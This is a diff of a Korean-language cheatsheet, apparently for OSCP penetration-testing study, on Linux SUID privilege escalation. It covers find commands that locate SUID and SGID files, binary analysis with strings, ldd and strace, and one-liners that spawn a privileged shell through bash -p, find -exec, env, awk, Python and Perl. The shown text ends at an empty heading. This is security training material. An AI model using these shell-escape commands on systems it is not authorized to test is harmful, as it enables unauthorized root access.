@@ -1,98 +1,71 @@
-# OSCP 침투 테스트 - SUID 권한 상승 치트시트
+# SUID 권한 상승
 
-## 1. 초기 정찰 및 SUID 파일 탐색
-
-### 시스템 전체에서 SUID 파일 검색
+## SUID 파일 검색
 
 ```bash
-# 기본 검색 - 모든 SUID 파일 찾기
+# 기본 SUID 파일 검색
 find / -perm -4000 -type f 2>/dev/null
 
-# 상세 정보와 함께 표시
-find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
+# 자주 악용되는 위치 집중 검색
+find /bin /usr/bin /sbin /usr/sbin /usr/local/bin -perm -4000 -type f 2>/dev/null
 
-# 특정 위치에서만 검색
-find /usr/bin -perm -4000 -type f 2>/dev/null
-find /bin -perm -4000 -type f 2>/dev/null
-find /usr/sbin -perm -4000 -type f 2>/dev/null
-find /usr/local/bin -perm -4000 -type f 2>/dev/null
-find /usr/local/sbin -perm -4000 -type f 2>/dev/null
+# 상세 정보 포함 검색
+find / -perm -4000 -type f -ls 2>/dev/null
 
-# root 소유자 SUID 파일만 필터링 (효율적)
-find / -perm -4000 -user root -type f 2>/dev/null
-
-# SGID 파일 검색 (그룹 권한으로 실행)
+# SGID 파일 검색 (그룹)
 find / -perm -2000 -type f 2>/dev/null
 
-# SUID와 SGID 모두 검색
+# SUID + SGID 함께 검색
 find / -perm -6000 -type f 2>/dev/null
 ```
 
-### 결과 분석 및 후보 추려내기
+## 결과 분석
 
 ```bash
-# 결과를 파일로 저장
+# 검색 결과 저장하고 분석
 find / -perm -4000 -type f 2>/dev/null | tee suid_files.txt
 
 # 알려진 취약 바이너리 필터링
-cat suid_files.txt | grep -E 'bash|find|nmap|vim|less|python|perl|ruby|awk|cp|tar|docker|screen|env|man|more'
-
-# root 소유 파일만 필터링해서 추출
-cat suid_files.txt | xargs -I{} ls -l {} 2>/dev/null | grep '^-rws.* root'
+grep -E 'bash|find|nmap|vim|less|python|perl|cp|tar|docker|screen|env' suid_files.txt
 ```
 
-## 2. SUID 파일 분석 방법
-
-### 각 파일별 분석 기법
+## SUID 파일 분석
 
 ```bash
-# 소유자 및 권한 확인
-ls -l /경로/대상파일
+# 권한/소유자 확인
+ls -l /path/to/binary
 
-# 파일 유형 분석
-file /경로/대상파일
+# 파일 유형 확인
+file /path/to/binary
 
-# 문자열 분석 - 쉘 명령어 검색
-strings /경로/대상파일 | grep -i "sh\|bash\|system\|exec\|popen"
+# 문자열 분석 - 쉘/명령어 실행 함수 검색
+strings /path/to/binary | grep -i "sh\|bash\|system\|exec\|popen"
 
-# 라이브러리 의존성 확인
-ldd /경로/대상파일
+# 라이브러리 의존성 확인 - 경로 조작 가능성 확인
+ldd /path/to/binary
 
-# strace로 시스템 호출 분석
-strace -f /경로/대상파일 2>&1 | grep -i "exec\|system"
+# 시스템 호출 모니터링
+strace -f /path/to/binary 2>&1 | grep -i "exec\|system\|open"
 ```
 
-### 판단 시 확인할 핵심 요소
-
-- 소유자가 root이며 s 비트가 설정되어 있는가? (-rwsr-xr-x)
-- 실행 가능한 바이너리인가?
-- 시스템 명령어 실행 (system, exec, popen) 함수를 포함하는가?
-- 상대 경로로 라이브러리나 파일을 로드하는가? (경로 조작 가능성)
-- 사용자 입력을 처리하는 방식이 안전한가? (명령어 삽입 가능성)
-
-## 3. 바이너리 별 권한 상승 기법
-
-### 쉘 직접 획득 기법
+## 자주 악용되는 SUID 바이너리
 
 ```bash
-# bash SUID 설정된 경우
-/bin/bash -p    # -p 옵션: 권한 보존 모드로 실행
+# bash - 권한 유지 실행
+/bin/bash -p
 
-# dash/sh SUID 설정된 경우
-/bin/dash -p
-/bin/sh -p
-
-# find 명령어
+# find - 명령 실행 기능 활용
 find . -exec /bin/sh -p \; -quit
 
-# env 명령어
+# env - 다른 프로그램 실행
 env /bin/sh -p
 
-# awk 활용
+# awk - 시스템 명령 실행
 awk 'BEGIN {system("/bin/sh -p")}'
 
-# 쉘 스크립트 실행기
-/path/to/suid_script.sh    # 직접 실행
+# python/perl - 인터프리터 활용
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+perl -e 'exec "/bin/sh -p"'
 ```
 
 ### 인터프리터 활용 기법
